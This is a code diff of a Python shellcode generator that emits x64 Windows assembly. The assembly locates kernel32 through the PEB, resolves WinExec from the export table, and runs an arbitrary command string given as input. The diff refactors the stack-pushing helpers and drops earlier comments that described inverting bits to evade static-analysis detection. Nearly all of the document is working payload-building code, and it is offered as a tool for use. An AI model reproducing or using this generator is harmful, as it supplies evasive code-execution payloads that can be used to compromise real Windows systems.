@@ -1,8 +1,10 @@
 # Reference: https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
+from typing import List
 from utils import convert
 
-def start() -> str:
+def get_kernel32_addr() -> str:
     return """
+; Get kernel32.dll Address
 xor rdi, rdi            ; RDI = 0x0
 mul rdi                 ; RAX&RDX = 0x0
 mov rbx, gs:[rax+0x60]  ; RBX = Address_of_PEB
@@ -95,25 +97,11 @@ push rbx                    ; place the return address from the api string call 
 ret                         ; return to API caller
 """
 
-def push_str_arg(hexarr) -> str:
-    asm = "push rax ; Null terminate string on stack"
-
-    for h in hexarr:
-        asm += f"""
-mov rax, {h}    ; not (reverse the bits) to avoid detection when static analysis
-not rax
-push rax        ; RSP = "calc.exe",0x0
-"""
-        
-    asm += "mov rcx, rsp"
-    return asm
-
 def def_api() -> str:
     return """
 apis:                       ; API Names to resolve addresses
-; WinExec | String length : 7
 xor rcx, rcx
-add cl, 0x7                 ; String length for compare string
+add cl, 0x7                 ; String length (len("WinExec") => 7) for comparing string
 mov rax, 0x9C9A87BA9196A80F ; not (reverse the bits) 0x9C9A87BA9196A80F = 0xF0,WinExec
 not rax
 shr rax, 0x8                ; xEcoll,0xFFFF --> 0x0000,xEcoll
@@ -123,34 +111,56 @@ call getapiaddr             ; Get the address of the API from Kernel32.dll Expor
 mov r14, rax                ; R14 = Kernel32.WinExec Address
 """
 
-def call_api(hexarr) -> str:
+def call_api(cmd_hexarr: List[str], shr_hex: str) -> str:
     asm = f"""
 ; UINT WinExec(
-;   LPCSTR lpCmdLine,    => RCX = "calc.exe",0x0
+;   LPCSTR lpCmdLine,    => RCX = "example.exe",0x0
 ;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
 ; );
 xor rcx, rcx
 mul rcx                     ; RAX & RDX & RCX = 0x0
+push rax                    ; Null terminate string on stack
 """
-    
-    asm += push_str_arg(hexarr)
+
+    if shr_hex == '0':
+        for cmd_hex in cmd_hexarr:
+            asm += f"""
+mov rax, 0x{cmd_hex}
+push rax
+"""
+
+    else:
+        for i in range(0, len(cmd_hexarr)):
+            if i == 0:
+                asm += f"""
+mov rax, 0x{cmd_hexarr[i]}
+shr rax, 0x{shr_hex}
+push rax
+"""
+            else:
+                asm += f"""
+mov rax, 0x{cmd_hexarr[i]}
+push rax
+"""
 
     # Push remaining argument
     asm += """
+mov rcx, rsp
 inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
 sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
-call r14                    ; Call WinExec("calc.exe", SW_HIDE)
+call r14                    ; Call WinExec("example.exe", SW_SHOWNORMAL)
 """
 
     return asm
 
 def generate(cmd: str) -> str:
     # cmd_hexarr = ["0x9A879AD19C939E9C"] # calc.exe
-    cmd_hexarr = convert.str2hex(cmd, True)
-    print(cmd_hexarr)
+    cmd_hexarr, shr_hex = convert.str2hex(cmd, True)
+    print("cmd_hexarr", cmd_hexarr)
+    print("shr_hex: ", shr_hex)
 
     asm = ""
-    asm += start()
+    asm += get_kernel32_addr()
     asm += get_exporttable_addr()
     asm += get_address_table()
     asm += get_namepointer_table()
@@ -161,5 +171,5 @@ def generate(cmd: str) -> str:
     asm += def_incloop()
     asm += def_resolveaddr()
     asm += def_api()
-    asm += call_api(cmd_hexarr)
+    asm += call_api(cmd_hexarr, shr_hex)
     return asm
